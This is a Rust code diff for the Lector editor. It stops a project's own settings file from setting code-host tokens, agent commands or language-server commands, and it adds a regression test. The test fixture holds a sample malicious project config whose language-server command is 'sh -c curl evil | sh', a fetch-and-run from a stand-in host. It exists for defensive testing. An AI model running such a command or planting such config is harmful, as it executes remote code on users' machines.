@@ -486,7 +486,9 @@ impl Default for Settings {
 
 const DEFAULT_SETTINGS_TOML: &str = r#"# Lector settings. Every key is shown with its default value.
 # Edit your copy (`settings.toml` in the config dir); a project may override
-# values in `<project>/.lector/settings.toml`. Unknown keys only produce warnings.
+# values in `<project>/.lector/settings.toml` (except [forge], agent servers and
+# language-server commands, which only this file may set). Unknown keys only
+# produce warnings.
 
 # --- Fonts ---------------------------------------------------------------
 # Interface font (falls back to the system UI font if not installed).
@@ -704,6 +706,47 @@ fn read_layer(path: &Path, warnings: &mut Vec<String>) -> Option<toml::Table> {
     }
 }
 
+/// Removes from a project layer what only the user's own settings may set: code hosts
+/// (`[forge]`: tokens could be sent elsewhere), agent commands (`agent.servers`) and
+/// language-server commands (`lsp.servers.*.command` / `args`, and `enabled = true`, which
+/// turns on servers that write into the project). Opening a project must never run a
+/// program the project chose.
+fn strip_user_only(layer: &mut toml::Table, file: &Path, warnings: &mut Vec<String>) {
+    let mut dropped = Vec::new();
+    if layer.remove("forge").is_some() {
+        dropped.push("[forge]".to_string());
+    }
+    if let Some(toml::Value::Table(agent)) = layer.get_mut("agent") {
+        if agent.remove("servers").is_some() {
+            dropped.push("agent.servers".to_string());
+        }
+    }
+    if let Some(toml::Value::Table(lsp)) = layer.get_mut("lsp") {
+        if let Some(toml::Value::Table(servers)) = lsp.get_mut("servers") {
+            for (name, server) in servers.iter_mut() {
+                let toml::Value::Table(server) = server else {
+                    continue;
+                };
+                for key in ["command", "args"] {
+                    if server.remove(key).is_some() {
+                        dropped.push(format!("lsp.servers.{name}.{key}"));
+                    }
+                }
+                if server.get("enabled") == Some(&toml::Value::Boolean(true)) {
+                    server.remove("enabled");
+                    dropped.push(format!("lsp.servers.{name}.enabled = true"));
+                }
+            }
+        }
+    }
+    for key in dropped {
+        warnings.push(format!(
+            "{}: {key} is ignored in project settings (set it in your own settings.toml)",
+            file.display()
+        ));
+    }
+}
+
 pub(crate) fn load_settings_from(
     user_file: &Path,
     project_root: Option<&Path>,
@@ -716,11 +759,8 @@ pub(crate) fn load_settings_from(
         .enumerate()
     {
         if let Some(mut layer) = read_layer(&file, &mut warnings) {
-            if i > 0 && layer.remove("forge").is_some() {
-                warnings.push(format!(
-                    "{}: [forge] is ignored in project settings (set it in your own settings.toml)",
-                    file.display()
-                ));
+            if i > 0 {
+                strip_user_only(&mut layer, &file, &mut warnings);
             }
             deep_merge(&mut merged, layer);
         }
@@ -792,6 +832,52 @@ mod tests {
         assert_eq!(s.forge.default_filter, "mine");
         assert_eq!(s.forge.api_urls["github.com"], "http://127.0.0.1:9");
         assert!(w.iter().any(|w| w.contains("[forge] is ignored")), "{w:?}");
+    }
+
+    /// Regression: a project's `.lector/settings.toml` could replace a language server's
+    /// command (run on open) or add agent commands.
+    #[test]
+    fn project_settings_cannot_define_commands() {
+        let dir = tempfile::tempdir().unwrap();
+        let user = dir.path().join("settings.toml");
+        std::fs::write(
+            &user,
+            "[lsp.servers.gopls]\ncommand = \"my-gopls\"\n[[agent.servers]]\nname = \"Mine\"\ncommand = \"mine\"\n",
+        )
+        .unwrap();
+        let project = dir.path().join("p");
+        std::fs::create_dir_all(project.join(".lector")).unwrap();
+        std::fs::write(
+            project.join(".lector/settings.toml"),
+            "[lsp.servers.rust-analyzer]\ncommand = \"sh\"\nargs = [\"-c\", \"curl evil | sh\"]\n\
+             [lsp.servers.gopls]\nargs = [\"x\"]\nenabled = false\n\
+             [lsp.servers.jdtls]\nenabled = true\n\
+             [[agent.servers]]\nname = \"Evil\"\ncommand = \"sh\"\n\
+             [agent]\ncheckpoints = false\n",
+        )
+        .unwrap();
+        let (s, w) = load_settings_from(&user, Some(&project));
+        assert!(
+            !s.lsp.servers.contains_key("rust-analyzer")
+                || s.lsp.servers["rust-analyzer"].command.is_none()
+        );
+        assert_eq!(s.lsp.servers["gopls"].command.as_deref(), Some("my-gopls"));
+        assert_eq!(s.lsp.servers["gopls"].args, None);
+        assert_eq!(
+            s.lsp.servers["gopls"].enabled,
+            Some(false),
+            "disabling stays allowed"
+        );
+        assert_eq!(s.lsp.servers.get("jdtls").and_then(|o| o.enabled), None);
+        assert_eq!(s.agent.servers.len(), 1);
+        assert_eq!(s.agent.servers[0].name, "Mine");
+        assert!(!s.agent.checkpoints, "other project settings still apply");
+        assert!(
+            w.iter()
+                .any(|w| w.contains("lsp.servers.rust-analyzer.command")),
+            "{w:?}"
+        );
+        assert!(w.iter().any(|w| w.contains("agent.servers")), "{w:?}");
     }
 
     #[test]
